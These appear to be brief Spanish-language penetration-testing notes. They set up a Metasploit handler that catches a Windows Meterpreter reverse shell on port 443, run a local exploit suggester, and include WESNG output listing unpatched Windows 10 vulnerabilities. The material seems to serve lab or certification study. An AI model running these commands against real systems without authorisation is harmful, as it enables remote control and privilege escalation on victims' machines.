# MSFCONSOLE 

```sh
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.20.133 
set LPORT 443
run

background

run post/multi/recon/local_exploit_suggester
```


## WESNG 

Se le pasa el systeminfo que extraimos del meterpreter para buscar vulnerabiliades del sistema operativo

```
python wes.py /home/kali/CPTA/info.txt

//OUTPUT 
Windows Exploit Suggester 1.05 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
[+] Operating System
    - Name: Windows 10 Version 22H2 for x64-based Systems
    - Generation: 10
    - Build: 19045
    - Version: 22H2
    - Architecture: x64-based
    - Installed hotfixes (5): KB5031988, KB5015684, KB5033372, KB5014032, KB5032907
[+] Loading definitions
    - Creation date of definitions: 20260219
[+] Determining missing patches
[!] Found vulnerabilities!

Date: 20230314
CVE: CVE-2022-29900
KB: KB
Title: AMD: CVE-2022-29900 AMD CPU Branch Type Confusion
Affected product: Windows 10 Version 22H2 for x64-based Systems
Affected component: AMD CPU Branch
Severity: Important
Impact: Information Disclosure
Exploit: n/a

Date: 20230509
CVE: CVE-2022-26928
KB: KB
Title: Windows Photo Import API Elevation of Privilege Vulnerability
Affected product: Windows 10 Version 22H2 for x64-based Systems
Affected component: Windows Photo Import API
Severity: Important
Impact: Elevation of Privilege
Exploit: n/a

```